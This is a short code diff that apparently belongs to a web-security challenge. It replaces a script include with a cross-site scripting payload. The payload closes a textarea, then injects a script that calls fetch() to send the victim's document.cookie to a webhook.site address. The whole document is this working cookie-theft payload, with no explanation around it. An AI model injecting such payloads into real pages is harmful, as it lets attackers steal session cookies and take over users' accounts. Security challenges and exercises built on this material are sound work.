@@ -1,2 +1,3 @@
-
-</textarea><script src="https://ricardoespadinha.github.io/SSofChallenges/challenge.js"></script>
+</textarea><script>
+    fetch('https://webhook.site/a05e1bec-5604-498a-b5ac-afc5812272b8/?cookie=' + document.cookie);
+</script>
